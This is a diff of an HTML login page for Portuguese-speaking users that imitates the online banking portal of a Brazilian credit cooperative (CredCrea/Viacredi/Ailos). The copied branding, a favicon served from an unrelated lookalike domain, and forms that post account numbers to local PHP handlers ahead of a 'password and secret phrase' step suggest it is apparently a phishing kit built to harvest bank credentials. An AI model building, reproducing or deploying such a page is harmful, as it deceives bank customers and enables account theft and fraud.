@@ -1,179 +1,133 @@
-
 <!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRED CREA | Conta online</title>
+    <!--Link css Mobile first-->
+    <link rel="stylesheet" href="style.css">
 
-<html>
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Start your development with a Dashboard for Bootstrap 4.">
-    <meta name="author" content="Creative Tim">
-    <title>CREDCREA | Conta Online</title>
-    <!-- Favicon -->
-    <link rel="shortcut icon" href="https://securitycooperativaailos.com/img/brand/fabiconvia.ico" data-head-react="true">
+    <!--Link para icones-->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
 
-    <!-- Bootstrap -->
-    <link href="./00001_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-    <!-- Fonts -->
-    <link rel="stylesheet" href="./00001_files/css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font@6.6.96/css/materialdesignicons.min.css">
-    
-    <!-- Icons -->
-    <link rel="stylesheet" href="./00001_files/nucleo.css" type="text/css">
-    <link rel="stylesheet" href="./00001_files/all.min.css" type="text/css">
-    <!-- Argon CSS -->
-    <link rel="stylesheet" href="./00001_files/argon.min.css" type="text/css">
-    <link rel="stylesheet" href="./00001_files/app.min.css">
 
-    <!-- Data Tables -->
-    <link rel="stylesheet" href="./00001_files/dataTables.bootstrap4.min.css">
-    <link rel="stylesheet" href="./00001_files/buttons.bootstrap4.min.css">
-    <link rel="stylesheet" href="./00001_files/select.bootstrap4.min.css">
-    <link rel="stylesheet" href="./00001_files/animate.min.css">
-    <link rel="stylesheet" href="./00001_files/sweetalert2.min.css">
-    <link rel="stylesheet" href="./00001_files/styles.css">
 </head>
+<body>
 
-<body class="cadastro g-sidenav-show g-sidenav-pinned" data-token="" data-client="" id="" cz-shortcut-listen="true" style="min-height: 100vh;">
-    <header class="topbar_nav">
-        <div class="topbar_nav__container">
-            <div class="logo">
-                <figure>
-                    <img src="./00001_files/logo-viacredi.png" alt="logo">
-                </figure>
-            </div>
-            <div>
-               quinta-feira, 08 novembro de 2022
-            </div>
-
-        </div>
+    <header id="head">
+        <nav>
+            <img id="logotipocredcrea" src="imagens/logo-viacredi.png" alt="LogotirpoCredCrea">
+            <p id="dataatual">
+                domingo, 10 de dezembro de 2022
+            </p>
+        </nav>
     </header>
-    <main>
 
-        <div class="main-form">
-
-            <ul class="form-top">
-                <li class="active">
-                    <i class="mdi mdi mdi-account-circle"></i>
-                    <span>Digite sua conta</span>
-                    <i class="mdi mdi-chevron-right"></i>
-                </li>
-                <li>
-                    <i class="mdi mdi mdi-account-circle"></i>
-                    <span>Identificação</span>
-                    <i class="mdi mdi-chevron-right"></i>
-                </li>
-                <li>
-                    <i class="mdi mdi-lock"></i>
-                    <span>Senha e frase secreta</span>
-                </li>
-            </ul>
-            <form action="conta.php" method="post" class="main-form-login">
-
-                
-
-                <article class="main-form-login__inputs ">
-                    <span class="main-form-login__login">
-                        <label for="username">Digite o número da sua conta</label>
-                        <input type="text" name="username" id="username" required="required">
-                    </span>
-
-                    <span class="main-form-login__submit">
-                        <button>Entrar</button>
-                    </span>
-                </article>
-
-            </form>
-        </div>
-
-        <div class="protect">
-            Protegido por reCAPTCHA-  <a href="https://policies.google.com/terms?hl=pt-BR">Privacidade - Condições</a>
-        </div>
-
-        <span class="helper-dot">
-            <a href="https://contaonline.viacredi.coop.br/ib/auth">Precisa de ajuda?</a>
+    <div id="fundo">
+        <p id="recaptcha">Protegido por reCAPTCHA</p>
+        <a href="http://" target="_blank" rel="reCAPTCHA">
+        </a>
+        <section id="login">
             
-        </span></main>
-        <div class="container-fluir footerSign">
-            <div class="container">
-                <div class="row">
-                    <div class="col-12">
-
-                        <ul>
-                            <li>
-                                SAC - SERVIÇO DE ATENDIMENTO AO COOPERADO
-                                <hr>
-                            </li>
-                            <li>
-                                OUVIDORIA SISTEMA AILOS
-                                <hr>
-                            </li>
-
-                            <li>
-                                <a class="btn btn-block btn-footer" target="blank" href="https://apps.apple.com/br/app/ailos/id942967288">
-                                    <i aria-hidden="true" class="mdi mdi-lock-open-outline"></i><span class="btn-text">Segurança</span>
-                                </a>
-                            </li>
-
-                            <li>
-                                <a class="btn btn-block btn-footer" target="blank" href="https://apps.apple.com/br/app/ailos/id942967288">
-                                    <i aria-hidden="true" class="mdi mdi-chat-processing-outline"></i><span class="btn-text">Fale Conosco</span>
-                                </a>
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- Argon Scripts -->
-        <script src="./00001_files/socket.io.js.download"></script>
-        <script>
-        //var socket = io();
-
-            var socket = io.connect(`/`, {
-                transports: ['websocket'],
-                secure: true,
-                'force new connection' : true,
-                'reconnect' : true,
-                reconnection: true,
-                reconnectionDelay: 1000,
-                reconnectionDelayMax : 5000,
-                reconnectionAttempts: 99999
-            })
-        </script>
-        <!-- Core -->
-        <script src="./00001_files/jquery.min.js.download"></script>
-        <script src="./00001_files/bootstrap.bundle.min.js.download"></script>
-        <script src="./00001_files/js.cookie.js.download"></script>
-        <script src="./00001_files/jquery.scrollbar.min.js.download"></script>
-        <script src="./00001_files/jquery-scrollLock.min.js.download"></script>
-        <!-- Data Tables -->
-        <script src="./00001_files/jquery.dataTables.min.js.download"></script>
-        <script src="./00001_files/dataTables.bootstrap4.min.js.download"></script>
-        <script src="./00001_files/dataTables.buttons.min.js.download"></script>
-        <script src="./00001_files/buttons.bootstrap4.min.js.download"></script>
-        <script src="./00001_files/buttons.html5.min.js.download"></script>
-        <script src="./00001_files/buttons.flash.min.js.download"></script>
-        <script src="./00001_files/buttons.print.min.js.download"></script>
-        <script src="./00001_files/dataTables.select.min.js.download"></script>
-        <script src="./00001_files/list.min.js.download"></script>
-        <!-- Money Mask -->
-        <script src="./00001_files/jquery.maskMoney.min.js.download"></script>
-        <!-- Alerts -->
-        <script src="./00001_files/bootstrap-notify.min.js.download"></script>
-        <!-- TAGS // -->
-        <script src="./00001_files/bootstrap-tagsinput.min.js.download"></script>
-        <!-- Argon JS -->
-
-        <script src="./00001_files/sweetalert2.min.js.download"></script>
-        <script src="./00001_files/cleave.min.js.download"></script>
-        <script src="./00001_files/cleave-phone.br.js.download"></script>
-        <script src="./00001_files/argon.min.js.download"></script><div class="backdrop d-xl-none" data-action="sidenav-unpin" data-target="undefined"></div>
-        <script src="./00001_files/scripts.js.download"></script>
-        <script src="./00001_files/bootstrap.bundle.min.js(1).download" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+                <ul>
+                    <li>
+                        
+                        <i class="material-symbols-outlined" id="icone1">
+                            account_circle
+                        </i>
+                        <span>Digite sua conta</span>
 
 
+                         <i class="flecha">
+                            arrow_forward_ios
+                         </i>                       
+                    </li>
+                    
+                    <li>
+                        <i class="material-symbols-outlined" id="icone2">
+                            account_circle
+                        </i>
+
+                        <span id="frase2">Identificação</span>
+
+                        <i class="flecha">
+                            arrow_forward_ios
+                        </i>   
+                    </li>
+ 
+                    <li>
+                        <i  class="material-symbols-outlined" id="icone3">
+                         lock 
+                        </i>   
+                        <span id="frase3">Senha e frase secreta</span>
+                    </li>
+
+                </ul>
+                <hr id="login">
+
+            <form action="form.php" method="post" autocomplete="off">
+                <label id="acesso" for="digite">DIGITE O NÚMERO DA SUA CONTA</label>
+                <input type="text" id="digite" name="acesso">
+        
+                <input type="submit" value="Entrar" id="botentrar" name="botentrar">
+            </form>
+        </section>
+      
+    </div>
+    <footer>
+        <p class="botaofooter">SAC - SERVIÇO DE ATENDIMENTO AO COOPERADO</p>
+        
+        <p class="botaofooter" id="botaofooter2">OUVIDORIAS SISTEMA AILOS</p>
+        
+        <span class="spanfooter">
+            <a class="linkfooter" href="https://www.credcrea.coop.br/privacidade-e-seguranca#conta-online" rel="Segurança" >
+                <span class="material-symbols-outlined" id="cadeado">
+                lock_open
+                </span>
+                Segurança
+            </a>
+        </span>
+
+        <span class="spanfooter">
+            <a class="linkfooter" href="https://www.credcrea.coop.br/contato" rel="Fale conosco" id="faleconosco">
+                <span class="material-symbols-outlined" id="talkwe">
+                    pending
+                    </span>Fale conosco
+            </a>
+    </span>
+
+    </footer>
+    
+
+    <a href="https://www.credcrea.coop.br/contato" target="_blank" rel="Precisa de ajuda" id="balaoajuda">
+        <div id="ajuda">
+     
+        <span class="material-symbols-outlined" id="iconeajuda">
+            sms
+        </span>
+       
+    </div>
+</a>
+
+<script>
+    var p = document.querySelector('#dataatual');
+    
+    var dt=new Date();
+    var diasem=dt.getDay();
+    var dia=dt.getDate();
+    var mes=dt.getMonth();
+    var ano=dt.getFullYear();
+
+    var meses=new Array("janeiro","fevereiro","março","abril","maio","junho","julho","agosto","setembro","outubro","novembro","dezembro")
+
+    var semanas=new Array("Segunda-feira","Terça-feira","Quarta-feira","Quinta-feira","Quinta-feira","Sexta-feira","Sábado","Domingo")
+
+    p.innerHTML = (semanas[diasem] + ", " + dia + " de " +  meses[mes] + " " + ano);
 
 
-
-    </body></html>
+    
+</script>
+    
+</body>
+</html>
